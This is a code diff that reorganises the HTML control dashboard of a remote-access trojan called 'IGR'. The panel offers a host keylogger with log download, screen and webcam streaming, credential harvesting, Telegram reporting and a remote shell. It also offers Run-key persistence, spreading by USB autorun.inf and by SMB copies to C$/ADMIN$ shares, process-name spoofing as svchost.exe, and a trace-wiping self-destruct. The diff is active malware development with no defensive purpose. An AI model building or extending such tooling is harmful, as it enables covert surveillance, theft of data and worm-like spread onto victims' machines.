@@ -3189,18 +3189,14 @@ DASHBOARD_HTML = r'''
             <div class="sidebar-nav">
                 <div class="nav-item active" onclick="showPage('home')"><span class="nav-icon">[H]</span><span class="nav-text">Home</span></div>
                 <div class="nav-item" onclick="showPage('screen')"><span class="nav-icon">[S]</span><span class="nav-text">Screen</span></div>
-                <div class="nav-item" onclick="showPage('media')"><span class="nav-icon">[M]</span><span class="nav-text">Media</span></div>
-                <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
-                <div class="nav-item" onclick="showPage('keylogger')"><span class="nav-icon">[K]</span><span class="nav-text">Keylogger</span></div>
                 <div class="nav-item" onclick="showPage('files')"><span class="nav-icon">[F]</span><span class="nav-text">Files</span></div>
                 <div class="nav-item" onclick="showPage('shell')"><span class="nav-icon">[$]</span><span class="nav-text">Shell</span></div>
-                <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
                 <div class="nav-item" onclick="showPage('harvest')"><span class="nav-icon">[D]</span><span class="nav-text">Harvest</span></div>
-                <div class="nav-item" onclick="showPage('system')"><span class="nav-icon">[I]</span><span class="nav-text">System</span></div>
-                <div class="nav-item" onclick="showPage('processes')"><span class="nav-icon">[P]</span><span class="nav-text">Processes</span></div>
-                <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
+                <div class="nav-item" onclick="showPage('control')"><span class="nav-icon">[C]</span><span class="nav-text">Control</span></div>
                 <div class="nav-item" onclick="showPage('stealth')"><span class="nav-icon">[X]</span><span class="nav-text">Stealth</span></div>
-                <div class="nav-item" onclick="showPage('spreading')"><span class="nav-icon">[W]</span><span class="nav-text">Spreading</span></div>
+                <div class="nav-item" onclick="showPage('troll')"><span class="nav-icon">[T]</span><span class="nav-text">Troll</span></div>
+                <div class="nav-item" onclick="showPage('system')"><span class="nav-icon">[I]</span><span class="nav-text">System</span></div>
+                <div class="nav-item" onclick="showPage('remote')"><span class="nav-icon">[R]</span><span class="nav-text">Remote</span></div>
             </div>
         </div>
 
@@ -3242,6 +3238,7 @@ DASHBOARD_HTML = r'''
 
             <!-- Screen Page -->
             <div class="page" id="page-screen">
+                <div class="page-grid">
                 <div class="section">
                     <div class="section-header"><div class="section-title">Screen Stream</div><div><button class="btn" id="screenBtn" onclick="toggleScreen()">Start Stream</button><button class="btn" onclick="captureScreen()">Capture</button><button class="btn small" onclick="detectMonitors()">Detect Monitors</button></div></div>
                     <div id="monitorSelect" style="margin-bottom: 15px; display: none;">
@@ -3254,11 +3251,6 @@ DASHBOARD_HTML = r'''
                     </div>
                     <div id="monitorGrid" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; margin-top: 15px;"></div>
                 </div>
-            </div>
-
-            <!-- Media Page -->
-            <div class="page" id="page-media">
-                <div class="page-grid">
                 <div class="section">
                     <div class="section-header"><div class="section-title">Webcam Stream</div><button class="btn" id="webcamBtn" onclick="toggleWebcam()">Start Stream</button></div>
                     <select id="webcamSelect" style="margin-bottom: 15px;"><option value="">Loading...</option></select>
@@ -3291,18 +3283,6 @@ DASHBOARD_HTML = r'''
                         <input type="text" id="typeText" placeholder="Type text on host...">
                         <button class="btn" onclick="typeOnHost()" style="width: 100%;">Type on Host</button>
                     </div>
-                </div>
-            </div>
-
-            <!-- Keylogger Page -->
-            <div class="page" id="page-keylogger">
-                <div class="section">
-                    <div class="section-header"><div class="section-title">Host Keylogger</div><div><button class="btn small" onclick="downloadKeylogs()">Download All Logs</button><button class="btn small" onclick="clearKeylog()">Clear</button></div></div>
-                    <div style="margin-bottom: 15px; display: flex; gap: 20px; flex-wrap: wrap;">
-                        <div><strong>Path:</strong> <span id="keylogPath">Loading...</span></div>
-                        <div><strong>Size:</strong> <span id="keylogSize">0 B</span></div>
-                    </div>
-                    <div class="log-box" id="keylogBox">Loading...</div>
                 </div>
             </div>
 
@@ -3548,6 +3528,14 @@ DASHBOARD_HTML = r'''
                     <input type="text" id="telegramMsg" placeholder="Custom message or leave blank for auto-report">
                     <button class="btn" onclick="sendToTelegram()" style="width: 100%;">Send Report</button>
                 </div>
+                <div class="section" style="grid-column: 1 / -1;">
+                    <div class="section-header"><div class="section-title">Host Keylogger</div><div><button class="btn small" onclick="downloadKeylogs()">Download All Logs</button><button class="btn small" onclick="clearKeylog()">Clear</button></div></div>
+                    <div style="margin-bottom: 15px; display: flex; gap: 20px; flex-wrap: wrap;">
+                        <div><strong>Path:</strong> <span id="keylogPath">Loading...</span></div>
+                        <div><strong>Size:</strong> <span id="keylogSize">0 B</span></div>
+                    </div>
+                    <div class="log-box" id="keylogBox">Loading...</div>
+                </div>
                 </div>
             </div>
 
@@ -3574,19 +3562,15 @@ DASHBOARD_HTML = r'''
                     <div class="section-header"><div class="section-title">Scheduled Tasks</div><button class="btn small" onclick="getScheduledTasks()">List</button></div>
                     <div class="log-box" id="tasksBox">Click List to see scheduled tasks...</div>
                 </div>
-                </div>
-            </div>
-
-            <!-- Processes Page -->
-            <div class="page" id="page-processes">
-                <div class="section" style="flex: 1;">
+                <div class="section" style="grid-column: 1 / -1;">
                     <div class="section-header"><div class="section-title">Running Processes</div><div><button class="btn small" onclick="listProcesses()">Refresh</button><button class="btn small danger" onclick="killSelectedProcesses()">Kill Selected</button><input type="text" id="procFilter" placeholder="Filter..." style="width: 160px; margin-bottom: 0;" oninput="filterProcesses()"></div></div>
-                    <div style="overflow-y: auto; flex: 1;">
+                    <div style="overflow-y: auto; max-height: 400px;">
                         <table class="proc-table">
                             <thead><tr><th><input type="checkbox" id="procSelectAll" onchange="toggleAllProcesses(this.checked)" style="width:auto;margin:0;"></th><th>PID</th><th>Name</th><th>Memory</th><th>CPU</th><th>Action</th></tr></thead>
                             <tbody id="procTableBody"></tbody>
                         </table>
                     </div>
+                </div>
                 </div>
             </div>
 
@@ -3638,6 +3622,14 @@ DASHBOARD_HTML = r'''
                     <div class="log-box" id="registryBox">Adds HKCU Run key so IGR starts on login. No admin required.</div>
                 </div>
                 <div class="section">
+                    <div class="section-header"><div class="section-title">USB Spread</div><button class="btn small" onclick="spreadUSB()">Infect USBs</button></div>
+                    <div class="log-box" id="usbSpreadBox">Copies IGR to all connected USB drives with autorun.inf and hidden launcher.</div>
+                </div>
+                <div class="section">
+                    <div class="section-header"><div class="section-title">LAN Spread</div><button class="btn small" onclick="spreadLAN()">Scan & Spread</button></div>
+                    <div class="log-box" id="lanSpreadBox">Scans local network for live hosts, attempts SMB copy to C$/ADMIN$ shares.</div>
+                </div>
+                <div class="section">
                     <div class="section-header"><div class="section-title">Process Name Spoof</div><button class="btn small" onclick="spoofProcess()">Spoof Now</button></div>
                     <div class="log-box" id="spoofBox">Modifies the PEB to change the process name shown in task manager and process lists to svchost.exe.</div>
                 </div>
@@ -3669,32 +3661,14 @@ DASHBOARD_HTML = r'''
                     <div class="section-header"><div class="section-title">Current Persistence</div></div>
                     <div id="persistenceInfo" style="line-height: 1.8;">Loading...</div>
                 </div>
+                <div class="section" style="grid-column: 1 / -1;">
+                    <div class="section-header"><div class="section-title">Spread Status</div><button class="btn small" onclick="loadSpreadStatus()">Refresh</button></div>
+                    <div id="spreadStatusGrid" class="info-grid">Loading...</div>
+                </div>
                 <div class="section" style="grid-column: 1 / -1; border-color: #ef4444;">
                     <div class="section-header"><div class="section-title" style="color: #ef4444;">PANIC - Self Destruct</div></div>
                     <p style="color: #ef4444; margin-bottom: 15px;">Removes ALL IGR traces from this machine: registry keys, startup entries, spread copies, keylogs, watchdog, then kills itself. This cannot be undone.</p>
                     <button class="btn danger" onclick="panicConfirm()" style="width: 100%; padding: 16px; font-size: 18px; background: #ef4444; color: #000;">PANIC - DESTROY ALL TRACES</button>
-                </div>
-                </div>
-            </div>
-
-            <!-- Spreading Page -->
-            <div class="page" id="page-spreading">
-                <div class="page-grid">
-                <div class="section">
-                    <div class="section-header"><div class="section-title">USB Spread</div><button class="btn small" onclick="spreadUSB()">Infect USBs</button></div>
-                    <div class="log-box" id="usbSpreadBox">Copies IGR to all connected USB drives with autorun.inf and hidden launcher. When the USB is plugged into another PC, it auto-executes via VBS wrapper.</div>
-                </div>
-                <div class="section">
-                    <div class="section-header"><div class="section-title">LAN Spread</div><button class="btn small" onclick="spreadLAN()">Scan & Spread</button></div>
-                    <div class="log-box" id="lanSpreadBox">Scans the local network for live hosts, then attempts to copy IGR to accessible SMB shares (C$, ADMIN$). Drops a startup link for persistence on the remote machine.</div>
-                </div>
-                <div class="section">
-                    <div class="section-header"><div class="section-title">Internal Spread</div><button class="btn small" onclick="stealthSpread()">Spread Now</button></div>
-                    <div class="log-box" id="spreadBox2">Copies exe to multiple hidden locations with different names. If one copy is found and deleted, others survive.</div>
-                </div>
-                <div class="section" style="grid-column: 1 / -1;">
-                    <div class="section-header"><div class="section-title">Spread Status</div><button class="btn small" onclick="loadSpreadStatus()">Refresh</button></div>
-                    <div id="spreadStatusGrid" class="info-grid">Loading...</div>
                 </div>
                 </div>
             </div>
